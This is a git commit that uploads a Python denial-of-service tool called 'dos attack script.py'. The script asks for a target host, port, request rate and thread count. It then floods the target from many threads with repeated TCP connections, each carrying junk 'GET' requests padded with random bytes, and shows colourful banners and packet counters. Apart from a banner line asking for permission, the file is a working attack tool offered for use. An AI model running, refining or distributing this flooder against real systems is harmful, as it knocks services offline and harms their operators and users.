72c7f4e76939b171b829ba98105f8225de127313
KNCMAP <kncbank@gmail.com>
2025-12-06 12:44:48 +0300

    Add files via upload

---
+++ dos attack script.py
@@ -0,0 +1,119 @@
+import os
+import socket
+import time
+import random
+
+from threading import Thread
+
+# above are the imports we shall use 
+
+os.system("clear") # this clears the terminal
+
+if not __name__ == "__main__":
+    exit()
+
+class ConsoleColors:
+    HEADER = "\033[95m"# used to create colors for the terminal
+    OKBLUE = "\033[94m"
+    OKGREEN = "\033[93m"
+    FAIL = "\033[92m"
+    WARNING = "\033[91m"
+    BOLD = "\033[91m"
+
+print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
+
+|  _ \  ___/ ___|    |_   _|__   ___ | |
+| | | |/ _ \___ \ _____| |/ _ \ / _ \| |
+| |_| | (_) |__) |_____| | (_) | (_) | |
+|____/ \___/____/      |_|\___/ \___/|_|
+
+         written by: DadyNews
+         for private USAGE ONLY
+         Make sure you have the
+        permission to attack the
+               given host
+
+
+''')
+
+#creating the port input function
+
+
+def getport():
+    try: 
+        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port: \r\n"))
+        return p
+    except:
+        p = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Port must be a natural number, set port to default" + ConsoleColors.OKGREEN + 
+                      "80"))
+        return 80
+    #user input section:
+
+host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host: \r\n")
+
+port = getport()
+
+speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits per run: \r\n"))
+
+threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count: \r\n"))
+
+ip = socket.gethostbyname(host)
+
+bytesToSend = random._urandom(2450)
+
+i = 0
+
+class Count:
+    packetCounter = 0
+
+def goForDosThatThing():
+    try:
+        while True:
+            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                dosSocket.connect((ip, port))
+                for i in range(speedPerRun):
+                    try:
+                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
+                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
+                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
+                        Count.packetCounter = Count.packetCounter + 1
+                    except socket.error:
+                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
+                    except KeyboardInterrupt:
+                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+            except socket.error:
+                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
+            except KeyboardInterrupt:
+                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+            dosSocket.close()
+    except KeyboardInterrupt:
+        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+try:
+        
+    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
+    _   _   _             _      ____  _             _   _             
+   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
+  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
+ / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
+/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
+                                                                 |___/ 
+          ''')
+    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
+    
+    for i in range(threads):
+        try:
+            t = Thread(target=goForDosThatThing)
+            t.start()
+        except KeyboardInterrupt:
+            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
+except KeyboardInterrupt:
+    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
